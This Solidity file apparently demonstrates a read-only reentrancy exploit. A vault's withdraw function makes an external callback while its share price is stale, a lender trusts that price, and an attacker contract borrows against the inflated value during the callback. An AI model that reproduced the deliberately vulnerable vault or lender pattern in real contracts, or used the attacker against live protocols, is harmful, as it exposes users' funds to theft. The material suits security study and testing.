// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ISharePriceCallback {
    function onReceive() external;
}

contract VulnerableShareVault {
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    uint256 public totalAssets;

    function seed(address user, uint256 userShares, uint256 assets) external {
        shares[user] = userShares;
        totalShares = userShares;
        totalAssets = assets;
    }

    function pricePerShare() external view returns (uint256) {
        return totalAssets * 1e18 / totalShares;
    }

    function withdraw(uint256 shareAmount) external {
        uint256 assets = shareAmount * totalAssets / totalShares;
        shares[msg.sender] -= shareAmount;
        totalShares -= shareAmount;

        // Reentrancy window: totalShares changed, totalAssets still old.
        ISharePriceCallback(msg.sender).onReceive();

        totalAssets -= assets;
    }
}

contract VictimLenderUsingSharePrice {
    VulnerableShareVault public immutable vault;
    mapping(address => uint256) public debt;

    constructor(VulnerableShareVault vault_) {
        vault = vault_;
    }

    function borrow(uint256 collateralShares) external {
        uint256 inflatedCollateralValue = collateralShares * vault.pricePerShare() / 1e18;
        debt[msg.sender] += inflatedCollateralValue / 2;
    }
}

contract SharePriceRORAttacker is ISharePriceCallback {
    VulnerableShareVault public vault;
    VictimLenderUsingSharePrice public lender;

    function attack(VulnerableShareVault vault_, VictimLenderUsingSharePrice lender_) external {
        vault = vault_;
        lender = lender_;
        vault.withdraw(vault.shares(address(this)) / 2);
    }

    function onReceive() external override {
        lender.borrow(vault.shares(address(this)));
    }
}
